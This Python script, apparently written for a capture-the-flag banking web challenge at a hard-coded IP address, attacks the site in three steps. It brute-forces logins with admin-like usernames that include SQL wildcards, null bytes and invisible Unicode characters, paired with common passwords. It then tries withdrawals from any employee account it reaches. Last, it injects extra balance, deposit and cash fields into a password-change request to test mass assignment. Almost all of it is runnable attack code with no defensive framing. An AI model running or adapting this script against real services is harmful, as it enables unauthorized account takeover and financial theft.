import urllib.request, urllib.parse, http.cookiejar, re

BASE = "http://103.163.47.230:33663"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def req(op, p, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    b = re.sub(r"<[^>]+>", " ", b)
    return re.sub(r"\s+", " ", b).strip()


def nums(t):
    d = re.search(r"(\d+) 存款余额", t)
    c = re.search(r"(\d+) 现金金币", t)
    return (d.group(1) if d else "?"), (c.group(1) if c else "?")


print("=== 影子账号弱口令")
USERS = ["Admin", "ADMIN", "admin_", "admin1", "admin2", "admin0", "admin.",
         "admin-", "admin ", "admin%", "adm%", "ad%", "a%", "%", "_", "%%",
         "adm", "admi", "adminx", "adminz", "root", "staff", "employee",
         "teller", "banker", "manager", "operator", "admin\t", "admin\n",
         "admin\x0b", "admin\x0c", "admin\u2029", "admin\u200b", "admin\ufeff",
         "admin\u200d", "admin\u180e", "admin\x00", "\x00admin"]
PWDS = ["pw123456", "123456", "admin", "admin123", "password", "PWNED123",
        "p", "admin888", "666666", "111111", "abc123", "000000", "root",
        "staff", "12345678", "qwerty", "test", "guest", "1"]

found = []
for u in USERS:
    for pw in PWDS:
        op = sess()
        s, b = req(op, "/login", {"username": u, "password": pw}, "POST")
        if "我的账户" in b:
            t = clean(b)
            m = re.search(r"我的账户（(.*?)）", t)
            who = m.group(1) if m else "?"
            emp = "内部员工" in t
            d, c = nums(t)
            print(f"  LOGIN {u!r:16s} / {pw!r:12s} -> as={who!r} dep={d} cash={c} {'EMPLOYEE' if emp else ''}")
            found.append((u, pw, op, emp, d, c))
            break
    else:
        pass

print("\n=== 员工账号提现测试")
for u, pw, op, emp, d, c in found:
    if not emp:
        continue
    s, b = req(op, "/withdraw", {"amount": "100"}, "POST")
    t = clean(b)
    print(f"  {u!r}/{pw!r} withdraw -> {t[:110]} {nums(t)}")

print("\n=== change_password 污染 balance（用普通账号）")
import random
for extra in [{"username": "admin", "balance": "99999"},
              {"username": "admin", "deposit": "99999"},
              {"username": "admin", "cash": "99999"},
              {"username": "admin%", "balance": "99999"}]:
    op = sess()
    u = "x" + "".join(random.choice("abcdefg") for _ in range(6))
    req(op, "/register", {"username": u, "password": "p"}, "POST")
    req(op, "/login", {"username": u, "password": "p"}, "POST")
    d = {"new_password": "NP123"}
    d.update(extra)
    s, b = req(op, "/change_password", d, "POST")
    op2 = sess()
    s2, b2 = req(op2, "/login", {"username": "admin", "password": "pw123456"}, "POST")
    t2 = clean(b2)
    print(f"  {str(extra):44s} -> admin dep/cash={nums(t2)} {t2[:60]}")
